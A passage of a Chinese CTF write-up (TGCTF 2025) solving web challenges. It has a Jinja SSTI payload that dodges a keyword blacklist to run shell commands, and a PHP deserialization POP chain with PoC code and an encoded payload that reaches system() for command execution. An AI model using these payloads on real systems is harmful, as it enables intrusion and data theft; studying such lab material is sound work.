class="hljs-string">&#x27;error&#x27;</span>: <span class="hljs-string">&#x27;只允许字母和数字！&#x27;</span>&#125;), <span class="hljs-number">400</span><br>    <span class="hljs-keyword">if</span> os.path.isfile(filename):<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>                content = file.read()<br>            <span class="hljs-keyword">return</span> content<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;error&#x27;</span>: <span class="hljs-built_in">str</span>(e)&#125;), <span class="hljs-number">500</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;error&#x27;</span>: <span class="hljs-string">&#x27;路径不存在或者路径非法&#x27;</span>&#125;), <span class="hljs-number">404</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">80</span>)<br></code></pre></td></tr></table></figure><p>然后就是代码审计了</p><p>我当时注意到了这里</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">from <span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.b</span><span class="hljs-selector-class">.c</span><span class="hljs-selector-class">.d</span><span class="hljs-selector-class">.secret</span> import secret_key<br></code></pre></td></tr></table></figure><p>所以就想着用&#x2F;aazz路由来读取secret</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">url<span class="hljs-regexp">/aazz?filename=/</span>a<span class="hljs-regexp">/b/</span>c<span class="hljs-regexp">/d/</span>secret.py<br></code></pre></td></tr></table></figure><p>拿到secret_key了</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment"># 找到六根又如何？还不是听天由命？直面天命吧，天命人！</span><br><span class="hljs-attr">secret_key</span> = <span class="hljs-string">&quot;直面天命&quot;</span><br></code></pre></td></tr></table></figure><p>但是后面我发现，源码里就写了有直面天命啊，我纯纯多此一举</p><p>拿到secret_key后简单代码审计，发现很简单，这里会先检查我们的payload前2个字符必须为直面，后两个字符为天命，接着会将直面替换为，这里很明显了要我们ssti注入。</p><p>先看看waf过滤了哪些东西</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">black_list</span>=[<span class="hljs-string">&#x27;&#123;&#x27;</span>,<span class="hljs-string">&#x27;&#125;&#x27;</span>,<span class="hljs-string">&#x27;popen&#x27;</span>,<span class="hljs-string">&#x27;os&#x27;</span>,<span class="hljs-string">&#x27;import&#x27;</span>,<span class="hljs-string">&#x27;eval&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;system&#x27;</span>,<span class="hljs-string">&#x27;read&#x27;</span>,<span class="hljs-string">&#x27;base&#x27;</span>,<span class="hljs-string">&#x27;globals&#x27;</span>]<br></code></pre></td></tr></table></figure><p>发现就过滤了一些关键字，可以用字符串拼接绕过，而最关键的大括号过滤也不用管了，源码自动给我们转换。</p><p>下划线可以用下划线的unicode编码，\x5f来替换</p><p>所以直接构造payload</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">直面lipsum<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;\x5f\x5fglo&#x27;</span><span class="hljs-string">&#x27;bals\x5f\x5f&#x27;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;o&#x27;</span><span class="hljs-string">&#x27;s&#x27;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;po&#x27;</span><span class="hljs-string">&#x27;pen&#x27;</span>]</span>(&#x27;ls /&#x27;)<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;re&#x27;</span><span class="hljs-string">&#x27;ad&#x27;</span>]</span>()天命<br></code></pre></td></tr></table></figure><p>回显</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stata">“六根”也凑齐了，你已经可以直面天命了！我帮你把“secret_key”替换为了“&#123;&#123;&#125;&#125;”<br>最后，如果你用了<span class="hljs-keyword">cat</span>，就可以见到齐天大圣了<br>Dockerfile a <span class="hljs-keyword">app</span>.py bin <span class="hljs-keyword">boot</span> dev etc flag home lib lib64 media mnt opt proc requirements.txt root <span class="hljs-keyword">run</span> <span class="hljs-keyword">run</span>.<span class="hljs-keyword">sh</span> sbin srv static sys tmp usr <span class="hljs-keyword">var</span> 描述和题解.txt<br></code></pre></td></tr></table></figure><p>发现flag，直接cat读取</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">直面lipsum<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;\x5f\x5fglo&#x27;</span><span class="hljs-string">&#x27;bals\x5f\x5f&#x27;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;o&#x27;</span><span class="hljs-string">&#x27;s&#x27;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;po&#x27;</span><span class="hljs-string">&#x27;pen&#x27;</span>]</span>(&#x27;cat /flag&#x27;)<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;re&#x27;</span><span class="hljs-string">&#x27;ad&#x27;</span>]</span>()天命<br></code></pre></td></tr></table></figure><p>拿到flag </p><hr><h3 id="什么文件上传？"><a href="#什么文件上传？" class="headerlink" title="什么文件上传？"></a>什么文件上传？</h3><p>一进去就是个文件上传的页面</p><p><img src="/../image/TGCTF-2025-1.png"></p><p>然后发现不管传什么都会显示hack，推测应该是白名单检测。然后查看网页源码发现。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- 机器人是啥？ --&gt;</span><br></code></pre></td></tr></table></figure><p>很明显提示我们访问robots.txt</p><p><img src="/../image/TGCTF-2025-2.png"></p><p>发现很多路径，但是试了一下只有&#x2F;class.php能打开，这里还提示文件允许上传的格式后缀是三个小写字母，这里应该是要爆破出白名单。访问class.php</p><p>代码审计</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">best64_decode</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$str</span>)))));<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">yesterday</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$learn</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$study</span>=<span class="hljs-string">&quot;study&quot;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$try</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;learn = <span class="hljs-string">&quot;learn&lt;br&gt;&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You studied hard yesterday.&lt;br&gt;&quot;</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;study-&gt;<span class="hljs-title function_ invoke__">hard</span>();<br>        &#125;<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">today</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$doing</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$did</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$done</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;did = <span class="hljs-string">&quot;What you did makes you outstanding.&lt;br&gt;&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span>, <span class="hljs-variable">$arg2</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;done = <span class="hljs-string">&quot;And what you&#x27;ve done has given you a choice.&lt;br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;done;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;doing))==<span class="hljs-number">666</span>)&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">doing</span>();<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;doing-&gt;better;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">tommoraw</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$good</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$bad</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$soso</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;good=<span class="hljs-string">&quot;You&#x27;ll be good tommoraw!&lt;br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;good;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;bad=<span class="hljs-string">&quot;You&#x27;ll be bad tommoraw!&lt;br&gt;&quot;</span>;<br>        &#125;<br><br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">future</span></span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$impossible</span>=<span class="hljs-string">&quot;How can you get here?&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$out</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$no</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$useful1</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful2</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful3</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful4</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful5</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful6</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful7</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful8</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful9</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful10</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful11</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful12</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful13</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful14</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful15</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful16</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful17</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful18</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful19</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful20</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span>, <span class="hljs-variable">$arg2</span></span>) </span>&#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;out-&gt;useful7) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Seven is my lucky number&lt;br&gt;&quot;</span>;<br>                <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;This is your future.&lt;br&gt;&quot;</span>;<br>            <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;wow&quot;</span>]);<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;win&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;no = <span class="hljs-string">&quot;no&quot;</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;no;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Focus on the previous step!&lt;br&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>],<span class="hljs-number">0</span>,-<span class="hljs-number">4</span>);<br>        <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">best64_decode</span>(<span class="hljs-variable">$data</span>));<br>    &#125;<br>    <span class="hljs-comment">// You learn yesterday, you choose today, can you get to your future?</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>很明显的反序列化漏洞，而且在future类中还发现了危险函数system($_POST[“wow”])，且参数还是我们可控的，直接post传参就行。发现有两个漏洞点能触发反序列化。</p><p>1、</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">if</span> (file_exists(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]))&#123;<br>  <span class="hljs-attribute">echo</span> <span class="hljs-string">&quot;Focus on the previous step!&lt;br&gt;&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>​    file_exists能触发phar反序列化，且filename是可控的，可以使用phar:&#x2F;&#x2F;伪协议。再配合首页的文件上传能将我们的phar文件上传，完全可以实现phar反序列化。</p><p>2、</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">else</span>&#123;<br>   <span class="hljs-variable">$data</span>=<span class="hljs-keyword">substr</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>],<span class="hljs-number">0</span>,-<span class="hljs-number">4</span>);<br>   unserialize(best64_decode(<span class="hljs-variable">$data</span>));<br>&#125;<br></code></pre></td></tr></table></figure><p>很明显unserialize能触发反序列化，但是这里会先对我们的pop链进行处理，会将末尾的4个字符截掉，并且会对我们的pop链进行5次base64解码，所以我们传入pop链之前先进行5次base64编码，然后在末尾添加4个任意字符。</p><p>这里我用的是第二个漏洞点，毕竟更简单。</p><p>构造pop链</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">yesterday</span>-&gt;</span>__<span class="hljs-function"><span class="hljs-title">destruct</span>（$this-&gt;</span><span class="hljs-function"><span class="hljs-title">study</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">hard</span>()）=&gt;today-&gt;</span>__<span class="hljs-function"><span class="hljs-title">call</span>（return $this-&gt;</span><span class="hljs-function"><span class="hljs-title">doing</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">better</span>;）=&gt;future-&gt;</span>__toString（system($_POST[<span class="hljs-string">&quot;wow&quot;</span>]);）<br></code></pre></td></tr></table></figure><p>编写poc</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs perl">&lt;?php<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">yesterday</span> </span>&#123;<br>    public <span class="hljs-variable">$study</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">today</span> </span>&#123;<br>    public <span class="hljs-variable">$doing</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">tommoraw</span> </span>&#123;<br>    public <span class="hljs-variable">$better</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">future</span> </span>&#123;<br>    public <span class="hljs-variable">$out</span>;<br>&#125;<br><br><span class="hljs-variable">$future</span> = new future();<br><br><span class="hljs-variable">$today</span> = new today();<br><span class="hljs-variable">$today</span>-&gt;doing = <span class="hljs-variable">$future</span>;<br><br><span class="hljs-variable">$yesterday</span> = new yesterday();<br><span class="hljs-variable">$yesterday</span>-&gt;<span class="hljs-keyword">study</span> = <span class="hljs-variable">$today</span>;<br><br><span class="hljs-regexp">//</span> 序列化 &amp; 多次 base64 编码<br><span class="hljs-variable">$payload</span> = serialize(<span class="hljs-variable">$yesterday</span>);<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">5</span>; <span class="hljs-variable">$i</span>++) &#123;<br>    <span class="hljs-variable">$payload</span> = base64_encode(<span class="hljs-variable">$payload</span>);<br>&#125;<br>echo <span class="hljs-variable">$payload</span>;<br><br>?&gt;<br></code></pre></td></tr></table></figure><p>拿到pop链</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">V<span class="hljs-name">m10</span>b<span class="hljs-number">2</span>QyU<span class="hljs-symbol">nJOVlpQV0</span>VKVVlXeGFhRll<span class="hljs-number">3</span>VlRCa<span class="hljs-number">01</span>XU<span class="hljs-symbol">npZVVYwYUUxWGVGcFpWRXB6</span>VlVkR<span class="hljs-number">2</span><span class="hljs-symbol">NsWlVTbUZXUlRWUFZHMXpNVlpYU1</span>hsaVIzQk<span class="hljs-number">9</span>UVlZzTkZZeWRHOWpiVVpXVDBoa<span class="hljs-number">1</span>VGSkdjRkJXYTJ<span class="hljs-symbol">NMVkwWndSbGw2</span>V<span class="hljs-name">m1</span>oTlYzaGFXVlJLYzFWSFJuSldWRXBoVmtVMVQxU<span class="hljs-symbol">nRjekZXVjBsNVlrZEdVMlZ0</span>ZUROWFZ<span class="hljs-number">6</span>QjRZVzFHVms<span class="hljs-number">5</span>SVpGQl<span class="hljs-symbol">NSbkJRV1</span>Zjd<span class="hljs-number">05</span>XTkdaSFJPV<span class="hljs-name">m1</span>ST<span class="hljs-number">1</span>VqRktXbFV<span class="hljs-number">5</span>TVRSVGJVWjBUMVJTVlUxcVZYZGFW<span class="hljs-name">M00</span>xWTFaU<span class="hljs-number">1</span>ZWZHJjR<span class="hljs-number">2</span>xXUj<span class="hljs-symbol">NRMFYydFdUMU5</span>yTkhoVmJrW<span class="hljs-symbol">nJVa2</span>Q<span class="hljs-number">0</span>ZEZZd<span class="hljs-number">1</span>VrSlBVVDA<span class="hljs-number">5</span><br></code></pre></td></tr></table></figure><p>payload：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">class.php?<span class="hljs-attribute">filename</span>=Vm10b2QyUnJOVlpQV0VKVVlXeGFhRll3VlRCa01XUnpZVVYwYUUxWGVGcFpWRXB6VlVkR2NsWlVTbUZXUlRWUFZHMXpNVlpYU1hsaVIzQk9UVlZzTkZZeWRHOWpiVVpXVDBoa1VGSkdjRkJXYTJNMVkwWndSbGw2Vm1oTlYzaGFXVlJLYzFWSFJuSldWRXBoVmtVMVQxUnRjekZXVjBsNVlrZEdVMlZ0ZUROWFZ6QjRZVzFHVms5SVpGQlNSbkJRV1Zjd05XTkdaSFJPVm1ST1VqRktXbFV5TVRSVGJVWjBUMVJTVlUxcVZYZGFWM00xWTFaU1ZWZHJjR2xXUjNRMFYydFdUMU5yTkhoVmJrWnJVa2Q0ZEZZd1VrSlBVVDA51234<br><br>post：<span class="hljs-attribute">wow</span>=cat /flag<br></code></pre></td></tr></table></figure><p>拿到flag</p><hr><h3 id="什么文件上传-复仇"><a href="#什么文件上传-复仇" class="headerlink" title="什么文件上传?复仇"></a>什么文件上传?复仇</h3><p>感觉就是上题的升级版，还是访问class.php查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">best64_decode</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$str</span>))));<br>    &#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">yesterday</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$learn</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$study</span>=<span class="hljs-string">&quot;study&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$try</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;learn = <span class="hljs-string">&quot;learn&lt;br&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You studied hard yesterday.&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;study-&gt;<span class="hljs-title function_ invoke__">hard</span>();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">today</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$doing</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$did</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$done</span>;<br>    <span class="hljs-keyword">public</span> <span 